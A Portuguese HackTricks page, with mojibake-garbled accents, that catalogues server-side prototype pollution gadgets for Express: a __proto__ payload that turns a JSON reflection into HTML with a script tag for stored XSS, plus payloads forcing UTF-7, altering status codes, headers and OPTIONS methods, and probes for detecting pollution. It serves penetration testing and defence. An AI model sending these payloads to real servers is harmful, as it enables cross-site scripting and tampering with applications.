# Gadgets de Polui√ß√£o de Prot√≥tipo no Express

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
## Servir respostas XSS

### Alterar o tipo de conte√∫do JSON para HTML

Em um aplicativo Express usando uma **resposta de tipo de conte√∫do JSON** e refletindo um JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Nesses casos, normalmente n√£o √© poss√≠vel XSS com um tipo de conte√∫do JSON. No entanto, com a polui√ß√£o de prot√≥tipo, podemos **confundir o Express para fornecer uma resposta em HTML.** Esta vulnerabilidade depende da aplica√ß√£o usar **`res.send(obj)`** e do uso do analisador de corpo com o tipo de conte√∫do application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Ao **poluir** tanto as propriedades **`body`** quanto **`_body`**, √© poss√≠vel fazer com que o **Express sirva o tipo de conte√∫do HTML** e reflita a propriedade `_body`, resultando em XSS armazenado.

### Renderizar UTF7

√â poss√≠vel fazer o express **renderizar conte√∫do UTF-7 com**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T√©cnicas de Varredura Seguras

### Espa√ßos JSON

O seguinte PP far√° com que atributos dentro de um JSON tenham um espa√ßo extra, o que n√£o quebrar√° a funcionalidade:
```json
{"__proto__":{"json spaces": " "}}
```
Ent√£o um JSON refletido ter√° a seguinte apar√™ncia:
```json
{"foo":  "bar"} -- Note the extra space
```
### Cabe√ßalhos Expostos

O seguinte gadget PP far√° com que o servidor envie de volta o cabe√ßalho HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Requer que o **m√≥dulo CORS esteja instalado**

### **M√©todo OPTIONS**

Com o seguinte payload, √© poss√≠vel **ocultar um m√©todo de uma resposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

√â poss√≠vel alterar o **c√≥digo de status retornado** usando o seguinte payload PP:
```json
{"__proto__":{"status":510}}
```
### Erro

Quando voc√™ atribui um prot√≥tipo a um primitivo, como uma string, isso resulta em uma **opera√ß√£o no-op, j√° que o prot√≥tipo deve ser um objeto**. Se voc√™ tentar atribuir um objeto prot√≥tipo ao pr√≥prio `Object.prototype`, isso **lan√ßar√° uma exce√ß√£o**. Podemos usar esses dois comportamentos para **detectar se a polui√ß√£o de prot√≥tipo foi bem-sucedida**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Refletido

Se a aplica√ß√£o estiver refletindo um objeto na resposta, voc√™ pode simplesmente criar um atributo com um **nome estranho e o `__proto__`** e se **apenas o nome estranho for refletido**, √© poss√≠vel que a web seja vulner√°vel:
```json
{"hacktricks":"rocks","__proto__":"test"}
```
Ou se a biblioteca Lodash ou similar for usada, voc√™ pode **definir uma propriedade via PP e dentro do objeto** e se essa propriedade n√£o for refletida √© porque o Lodash olha para o objeto atual para ver se a propriedade j√° existe no objeto mesclado:
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## Diversos

### Permitir Pontos

Existe uma op√ß√£o no Express que permite **criar objetos a partir de par√¢metros de string de consulta**.\
Voc√™ poderia definitivamente us√°-la em uma **cadeia de bugs** para explorar uma **vulnerabilidade de polui√ß√£o de prot√≥tipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cria um objeto em Node.**

## Refer√™ncias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Aprenda AWS hacking do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
